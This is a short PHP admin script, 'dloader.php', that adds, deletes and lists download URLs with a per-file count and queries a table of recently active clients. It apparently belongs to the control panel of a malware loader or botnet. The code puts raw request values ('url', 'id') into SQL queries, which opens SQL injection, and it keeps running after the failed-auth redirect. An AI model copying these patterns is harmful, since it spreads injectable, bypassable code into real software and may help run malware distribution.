<?

require_once "common.php";

if (!check_auth() || !isset($_SESSION['admin']))
{
      logout();
      header("location: index.php");
}

switch (@$_GET['d'])
{
        case "add":
        if (!isset($_POST['url']))
                break;

        $sql = "INSERT INTO `files` (`url`, `dnum`) VALUES ('{$_POST['url']}', '".intval($_POST['dnum'])."')";

        db_query($sql);
        header ("location: dloader.php");
        break;

        case "del":
        if (!isset($_GET['id']))
                break;
        $sql = "DELETE FROM `files` WHERE `id`='{$_GET['id']}'";
        db_query($sql);
        header ("location: dloader.php");
        break;
}

$sql = "SELECT * FROM `files`";
$r = db_query($sql);

$files = array();
while ($f = mysql_fetch_array($r))
       $files[] = $f;

$smarty->assign("files", $files);
$smarty->assign("files_num", sizeof($files));

$sql = "SELECT * FROM `stat` WHERE ".time()."-`last`<".$opt['timeout']*60;
$r = mysql_query($sql);

$smarty->assign("tpl", "dloader.tpl");
$smarty->display("index.tpl");

?>